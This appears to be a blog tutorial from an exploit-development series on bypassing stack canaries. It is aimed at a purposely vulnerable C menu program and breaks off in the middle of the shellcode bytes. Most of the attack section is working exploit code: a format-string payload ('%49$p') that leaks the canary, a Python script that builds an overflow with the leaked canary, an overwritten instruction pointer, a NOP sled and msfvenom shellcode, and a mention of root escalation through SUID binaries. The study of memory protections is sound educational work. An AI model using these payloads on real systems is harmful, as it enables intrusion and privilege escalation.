<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv='cache-control' content='no-cache'> 
    <meta http-equiv='expires' content='0'> 
    <meta http-equiv='pragma' content='no-cache'>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content=""
    />
    
      
        <title>[Exploit development] 0A- Dancing with Memory Guards: Breaking Canaries/Cookies, DEP/NX, and ASLR | 0xNinjaCyclone Blog</title>
      
    
    <link rel="stylesheet" href="/css/reset.css"/>
    <link rel="stylesheet" href="/css/font.css"/>
    <link rel="stylesheet" href="/css/smigle2.css"/>
    
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-180x180.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/fav-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/fav-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="safary-1120x1120.png" color="#5bbad5">
    <meta name="msapplication-TileColor" content="#da532c">
    <meta name="theme-color" content="#ffffff">
  </head>
  
  <body>
    <div id="root">
      <header>
  <div id="brand">
    <a class="icon-link" href="https://0xninjacyclone.github.io/">
      <img
        class="icon"
        src="/images/logo.png"
      />
    </a>
    <div class="text">
      <a href="https://0xninjacyclone.github.io/"><h1>0xNinjaCyclone Blog</h1></a>
      <h3>Penetration tester and Red teamer</h3>
    </div>
  </div>
  <nav>
    
      
        
        <a href="/"><b>Home</b></a>
      
         | 
        <a href="/about/"><b>About</b></a>
      
         | 
        <a href="/categories/"><b>Categories</b></a>
      
         | 
        <a href="/tags/"><b>Tags</b></a>
      
    
  </nav>
  <hr />
</header>

      <div id="content">
        
  <main>
    <article>
      <h1 class="title">[Exploit development] 0A- Dancing with Memory Guards: Breaking Canaries/Cookies, DEP/NX, and ASLR</h1>
      
      <div class="post-meta">
  <strong>
    <span>Posted on</span>
    <time>2025-03-19</time>
    <span>in</span>
    
      <a href="/categories/exploitdev">exploitdev</a>
  </strong>
  <span> • 9884 words</span>
  <span> • 47 minute read</span>
  
  
    <div>
      <span>Tags:</span>
      
        <a href="/tags/exploit-development">exploit-development</a>, 
        <a href="/tags/binary-exploitation">binary-exploitation</a>, 
        <a href="/tags/vulnerability-research">vulnerability-research</a>, 
        <a href="/tags/aslr">ASLR</a>, 
        <a href="/tags/dep">DEP</a>, 
        <a href="/tags/nx">NX</a>, 
        <a href="/tags/stack-canary">stack-canary</a>, 
        <a href="/tags/stack-cookie">stack-cookie</a>
    </div>
  
</div>

      <div class="content"><h2 id="intro">Intro</h2>
<p><a href="https://0xninjacyclone.github.io/posts/exploitdev_9_bof/">In the previous post</a>, we discussed stack-based buffer overflow vulnerabilities in depth from several aspects, such as the methods used to discover this type of vulnerability. We also touched on fuzzing and how we can benefit from it. We also talked about strategies for exploiting this type of vulnerability based on the nature of the targeted program and its working mechanisms. We also discussed methods of protection and defense against this type of vulnerability, and we explained some common mistakes that may lead to bypassing these defenses. You must read it to understand this post, as we will build on what was mentioned there.</p>
<p>One of the things we explained was hijacking the execution flow by overwriting the instruction pointer and forging it with another pointer that references our own instructions. In this way, we would force the program to execute arbitrary code of our own. Unfortunately, life isn&rsquo;t that easy, as there are many powerful protections and mitigations that prevent us from doing this so simply.</p>
<p>But don&rsquo;t worry, my friend. I don&rsquo;t deny the power and effectiveness of these protections, especially when combined, making exploitation more difficult and complex. However, if we fully understand how these protections work and the keys of the targeted program, we can circumvent them and bypass them with creative tricks.</p>
<h2 id="the-fckin-mousetrap--cookies--canaries-">The F*ckin Mousetrap ( Cookies / Canaries )</h2>
<p>This type of memory protection is exactly like a mousetrap. When your home has some openings that allow mice to enter and mess around, one solution you might take is to set traps to reduce the danger of these mice by luring them with some cheese. As soon as they fall into the trap, you get rid of them, which reduces their greater danger to vital things in the home. However, there are clever mice that can detect the trick, avoid the trap, and continue with their mission. That is where the philosophy of cookie/canary protection came from, and we will follow up on this same philosophy as mice to bypass them and not fall into the trap.</p>
<center><p><img src="https://cdn.wibu.com/fileadmin/_processed_/7/9/csm_Traps_against_Hacker_570d8ae8d4.webp" width="600" height="400"/>https://www.wibu.com/pl/magazine/keynote-articles/article/detail/traps-against-hacker.html</p></center>
<p>A canary/cookie is a random value generated by the program when it starts executing. Each time the program runs, it generates a unique value. This value is placed at the end of each stack frame in a subsequent location for the data and variables of the function. When the function corresponding to that frame gets called and completes execution before returning, it checks the previously generated value. If it has been hit, i.e., the value has changed, this indicates an overflow. Accordingly, the function does not return, and the program closes completely. That thwarts any exploit that attempts to overwrite the instruction pointer and redirect the program execution flow.</p>
<h3 id="analyzing-security-canariescookies">Analyzing Security Canaries/Cookies</h3>
<p>Let&rsquo;s take the following code as an example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> cName[<span style="color:#ae81ff">16</span>];
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, cName);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>( cName );
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>And compile it as follows:</p>
<pre tabindex="0"><code>┌──(user㉿host)-[~]
└─$ gcc test.c -o test
</code></pre><p>Then we disassemble the main function and find the following instructions:</p>
<pre tabindex="0"><code>0000000000001149 &lt;main&gt;:
    1149:       55                      push   rbp
    114a:       48 89 e5                mov    rbp,rsp
    114d:       48 83 ec 10             sub    rsp,0x10
    1151:       48 8d 45 f0             lea    rax,[rbp-0x10]
    1155:       48 89 c6                mov    rsi,rax
    1158:       48 8d 05 a5 0e 00 00    lea    rax,[rip+0xea5]        # 2004 &lt;_IO_stdin_used+0x4&gt;
    115f:       48 89 c7                mov    rdi,rax
    1162:       b8 00 00 00 00          mov    eax,0x0
    1167:       e8 d4 fe ff ff          call   1040 &lt;__isoc99_scanf@plt&gt;
    116c:       48 8d 45 f0             lea    rax,[rbp-0x10]
    1170:       48 89 c7                mov    rdi,rax
    1173:       e8 b8 fe ff ff          call   1030 &lt;puts@plt&gt;
    1178:       90                      nop
    1179:       c9                      leave
    117a:       c3                      ret
</code></pre><p>This is roughly the familiar format of the instructions we&rsquo;ve seen in previous posts. But let me show you how it will look when we ask the compiler to integrate canary/cookie protection.</p>
<pre tabindex="0"><code>┌──(user㉿host)-[~]
└─$ gcc -fstack-protector test.c -o test
                    
</code></pre><p>Focus on this picture carefully and compare the result of this dissemble with the previous one.</p>
<center><img src="/imgs/mitigations_gdb_canary.png"/></center>
<p>Eight bytes are loaded from the F Segment register at the main function prologue and pushed onto the stack above the saved base pointer (RBP-0x8). While in the epilogue, the original canary/cookie is compared to that on the stack. The comparison is performed as follows:</p>
<ol>
<li>The canary/cookie previously pushed onto the stack gets loaded into the accumulator register (RAX)</li>
<li>The canary/cookie value gets subtracted from the original one in the F Segment register.</li>
<li>If both are the same, the Zero Flag gets triggered, allowing execution to be redirected to the ret instruction.</li>
<li>Otherwise, the execution is redirected to a function called <code>__stack_chk_fail</code> that displays a fatal error message and terminates the process.</li>
</ol>
<center><img src="/imgs/mitigations_gdb_smash.png"/></center>
<p>Once passing a large input, the program execution gets hijacked by the <code>__stack_chk_fail</code> function, which displays an error on the screen telling us that stack smashing occurred, and the program gets killed by the <code>__pthread_kill_implementation</code> function.</p>
<p>The stack layout is exactly like follows:</p>
<pre tabindex="0"><code>        *--------------------------* &lt;-- Frame data &amp; Buffers
        |                          |
        |                          |
        |                          |
-0x8 -&gt; *--------------------------* &lt;-- Canary / Cookie
        |                          |
+0x0 -&gt; *--------------------------* &lt;-- Saved RBP ( Base Pointer )
        |                          |
+0x8 -&gt; *--------------------------* &lt;-- Saved RIP ( Instruction Pointer )
        |                          |      
        *--------------------------*
</code></pre><p>It&rsquo;s really a big challenge because the canary is placed in a critical location, where we have to overwrite it to get into vital stuff like the instruction pointer.</p>
<h3 id="leaking-it-out-leads-to-winning">Leaking it out Leads to Winning!</h3>
<p>One strategy to defeat canaries/cookies is to leak them first, then craft a payload containing the leaked canary, causing the comparison to fail because the canary in the stack after the attack is still the same as the original canary. Let&rsquo;s take an example:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> data[<span style="color:#ae81ff">256</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpReadData;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> nSize;
</span></span><span style="display:flex;"><span>} Buffer;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Buffer <span style="color:#a6e22e">buf_new</span>() {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (Buffer) { <span style="color:#ae81ff">0x00</span> };
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buf_write</span>(Buffer <span style="color:#f92672">*</span>pBuf, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpData, <span style="color:#66d9ef">size_t</span> n) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( pBuf<span style="color:#f92672">-&gt;</span>nSize ) 
</span></span><span style="display:flex;"><span>        pBuf<span style="color:#f92672">-&gt;</span>data[ pBuf<span style="color:#f92672">-&gt;</span>nSize<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39; &#39;</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>( pBuf<span style="color:#f92672">-&gt;</span>data <span style="color:#f92672">+</span> pBuf<span style="color:#f92672">-&gt;</span>nSize, cpData, n );
</span></span><span style="display:flex;"><span>    pBuf<span style="color:#f92672">-&gt;</span>nSize <span style="color:#f92672">+=</span> n;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buf_read</span>(Buffer <span style="color:#f92672">*</span>pBuf) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>pBuf<span style="color:#f92672">-&gt;</span>cpReadData )
</span></span><span style="display:flex;"><span>        pBuf<span style="color:#f92672">-&gt;</span>cpReadData <span style="color:#f92672">=</span> pBuf<span style="color:#f92672">-&gt;</span>data;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( pBuf<span style="color:#f92672">-&gt;</span>cpReadData );
</span></span><span style="display:flex;"><span>    pBuf<span style="color:#f92672">-&gt;</span>cpReadData <span style="color:#f92672">+=</span> pBuf<span style="color:#f92672">-&gt;</span>nSize;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">buf_readall</span>(Buffer <span style="color:#f92672">*</span>pBuf) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>( pBuf<span style="color:#f92672">-&gt;</span>data );
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span>() {
</span></span><span style="display:flex;"><span>    Buffer buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">buf_new</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> nChoice, c;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( ;; ) {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">1- Write</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2- Read</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">3- Read full data</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">4- Exit</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">Choose: &#34;</span> );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">scanf</span>( <span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>nChoice );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">// Clearing the buffer so nothing breaks `getdelim` later ;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#66d9ef">while</span> ( (c <span style="color:#f92672">=</span> <span style="color:#a6e22e">getchar</span>()) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0x0a</span> <span style="color:#f92672">&amp;&amp;</span> c <span style="color:#f92672">!=</span> EOF ); 
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( nChoice <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span> ) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>cpLine <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">size_t</span> n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">printf</span>( <span style="color:#e6db74">&#34;Data: &#34;</span> );
</span></span><span style="display:flex;"><span>            n <span style="color:#f92672">=</span> <span style="color:#a6e22e">getdelim</span>( (<span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>)<span style="color:#f92672">&amp;</span>cpLine, <span style="color:#f92672">&amp;</span>n, <span style="color:#ae81ff">0x0a</span>, stdin );
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">~</span>n ) <span style="color:#75715e">// Sanity check to avoid calling `buf_write` if `getdelim` failed
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#a6e22e">buf_write</span>( <span style="color:#f92672">&amp;</span>buf, cpLine, n );
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">free</span>( cpLine );
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( nChoice <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span> )
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">buf_read</span>( <span style="color:#f92672">&amp;</span>buf );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( nChoice <span style="color:#f92672">==</span> <span style="color:#ae81ff">3</span> )
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">buf_readall</span>( <span style="color:#f92672">&amp;</span>buf );
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( nChoice <span style="color:#f92672">==</span> <span style="color:#ae81ff">4</span> )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span> 
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">puts</span>( <span style="color:#e6db74">&#34;[-] Invalid choice!&#34;</span> );
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is a simple program that allows users to write and read data interactively. Let&rsquo;s compile and run it with the canary protection enabled:</p>
<pre tabindex="0"><code>┌──(user㉿host)-[~]
└─$ gcc -fstack-protector -zexecstack test.c -o test
                                                                                                                                                         
┌──(user㉿host)-[~]
└─$ ./test


1- Write
2- Read
3- Read full data
4- Exit

Choose: 1
Data: Hello Guys


1- Write
2- Read
3- Read full data
4- Exit

Choose: 2
Hello Guys


1- Write
2- Read
3- Read full data
4- Exit

Choose: 1
Data: I&#39;m 0xNinjaCyclone


1- Write
2- Read
3- Read full data
4- Exit

Choose: 2
I&#39;m 0xNinjaCyclone


1- Write
2- Read
3- Read full data
4- Exit

Choose: 3
Hello Guys I&#39;m 0xNinjaCyclone


1- Write
2- Read
3- Read full data
4- Exit

Choose: 4
                                                                                                                                                         
┌──(user㉿host)-[~]
└─$ 
</code></pre><p>If you pay attention to the read functions, you will find that they are both vulnerable to the <a href="https://0xninjacyclone.github.io/posts/exploitdev_7_strfmt/">format string vulnerability</a>, where user-controled data is passed to the <code>printf</code> function as a format, not in a safe way. The <code>buf_read</code> function is also vulnerable to the <a href="https://0xninjacyclone.github.io/posts/exploitdev_8_bor/">buffer over-read</a> vulnerability, as the <code>pBuf-&gt;cpReadData</code> pointer prints what it points to and moves to the memory after what it has read without ever checking whether the memory it moved to belongs to the buffer it is supposed to read from or not. Exploiting any one of which those two bugs, would allow us to leak the secret canary/cookie.</p>
<center><img src="/imgs/mitigations_canary_leak.png"/></center>
<p>As you can see, we can exploit the format string bug to leak the canary by injecting <code>%49$p</code> as a payload via the write function and leaking it out by leveraging the read function. Read <a href="https://0xninjacyclone.github.io/posts/exploitdev_7_strfmt/">the format string exploitation post</a> to understand what we did. We can automate this using Python as follows:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak_canary</span>(p: Popen):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%49$p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span><span style="display:flex;"><span>    out <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    canary_pos <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    n <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> n <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">1024</span>:
</span></span><span style="display:flex;"><span>        out <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>stdout<span style="color:#f92672">.</span>readline()
</span></span><span style="display:flex;"><span>        canary_pos <span style="color:#f92672">=</span> out<span style="color:#f92672">.</span>find( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0x&#34;</span> )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> bool( <span style="color:#f92672">~</span>canary_pos ):
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        n <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> int( out[canary_pos : canary_pos<span style="color:#f92672">+</span><span style="color:#ae81ff">18</span>], <span style="color:#ae81ff">16</span> )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> canary
</span></span></code></pre></div><p>This function takes a handler object to the target process, injects the payload, leaks the canary, and then returns the canary to the caller after converting it to an integer value or returning -1 on failure.</p>
<p>Now, we can craft a payload that overwrites the canary with the correct value, injects a shellcode, and redirects the execution flow by overwriting the instruction pointer.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">hijack_exec</span>(p: Popen, canary):
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x112</span>                               <span style="color:#75715e"># Fills the stack frame</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, canary )                <span style="color:#75715e"># Places the correct canary value </span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>                                 <span style="color:#75715e"># Base pointer</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> struct<span style="color:#f92672">.</span>pack( <span style="color:#e6db74">&#34;&lt;Q&#34;</span>, <span style="color:#ae81ff">0x7fffffffdd60</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x40</span> ) <span style="color:#75715e"># Instruction pointer</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x40</span>                             <span style="color:#75715e"># NOPs for padding</span>
</span></span><span style="display:flex;"><span>    payload <span style="color:#f92672">+=</span> buf                                        <span style="color:#75715e"># Shellcode</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( payload <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>flush()
</span></span></code></pre></div><p>We followed the same approach we discussed in <a href="https://0xninjacyclone.github.io/posts/exploitdev_9_bof/">the buffer overflow post</a>, filling the frame with junk data with the canary in place to bypass the protection, injecting the shellcode into the previous frame, and replacing the instruction pointer to reference the shellcode. However, for the shellcode to execute, the main function must return. We can do this using the fourth function (exit), which breaks the loop and allows the main function to return.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exit_target</span>(p: Popen):
</span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>stdin<span style="color:#f92672">.</span>write( <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> )
</span></span></code></pre></div><p>This function must be called after injection to force the program to execute shellcode.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># We use &#39;stdbuf -o0&#39; to force the targeted program pipes to be flushed</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># So we can read leaked canary/cookie immediately</span>
</span></span><span style="display:flex;"><span>    p <span style="color:#f92672">=</span> Popen( [<span style="color:#e6db74">&#34;stdbuf&#34;</span>, <span style="color:#e6db74">&#34;-o0&#34;</span>, TARGET_PATH], stdin<span style="color:#f92672">=</span>PIPE, stdout<span style="color:#f92672">=</span>PIPE )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Make stdout non-blocking when using read/readline</span>
</span></span><span style="display:flex;"><span>    flags <span style="color:#f92672">=</span> fcntl<span style="color:#f92672">.</span>fcntl( p<span style="color:#f92672">.</span>stdout, fcntl<span style="color:#f92672">.</span>F_GETFL )
</span></span><span style="display:flex;"><span>    fcntl<span style="color:#f92672">.</span>fcntl( p<span style="color:#f92672">.</span>stdout, fcntl<span style="color:#f92672">.</span>F_SETFL, flags <span style="color:#f92672">|</span> os<span style="color:#f92672">.</span>O_NONBLOCK )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    canary <span style="color:#f92672">=</span> leak_canary( p )
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> bool( <span style="color:#f92672">~</span>canary ):
</span></span><span style="display:flex;"><span>        print( <span style="color:#e6db74">&#34;Canary : 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> canary )
</span></span><span style="display:flex;"><span>        hijack_exec( p, canary )
</span></span><span style="display:flex;"><span>        exit_target( p )
</span></span><span style="display:flex;"><span>        out, _ <span style="color:#f92672">=</span> p<span style="color:#f92672">.</span>communicate()
</span></span><span style="display:flex;"><span>        print( out<span style="color:#f92672">.</span>decode() )
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        exit_target( p )
</span></span><span style="display:flex;"><span>        print( <span style="color:#e6db74">&#34;[-] Failed to leak the canary&#34;</span> )
</span></span></code></pre></div><p>In the main function, we start the target process with the <code>stdbuf -o0</code> command so that we can read the output efficiently while it is running, even if the process doesn&rsquo;t flush the output pipes. We also force the operating system not to block the output pipes so that we don&rsquo;t get stuck and deadlock occurs. Next, we leak the canary. If we succeed, the process will be injected and the execution flow will be redirected after triggering that using the exit function. If we fail, the program exits.</p>
<p>Let&rsquo;s run the exploit:</p>
<center><img src="/imgs/mitigations_exploit_1.png"/></center>
<p>Great, we could bypass the stack canary and execute a shellcode that runs the &lsquo;id&rsquo; command. If the program is owned by the root and has SUID permission, we can gain root privileges as we have seen in <a href="https://0xninjacyclone.github.io/posts/exploitdev_9_bof/">the previous blog post</a>.</p>
<p>Here is the full exploitation code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> struct<span style="color:#f92672">,</span> os<span style="color:#f92672">,</span> fcntl
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> subprocess <span style="color:#f92672">import</span> Popen, PIPE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TARGET_PATH <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./test&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># msfvenom -a x64 --platform linux -p linux/x64/exec -b &#34;\x0a&#34; -f py AppendExit=true CMD=&#34;id&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50</span><span style="color:#e6db74">&#34;</span>
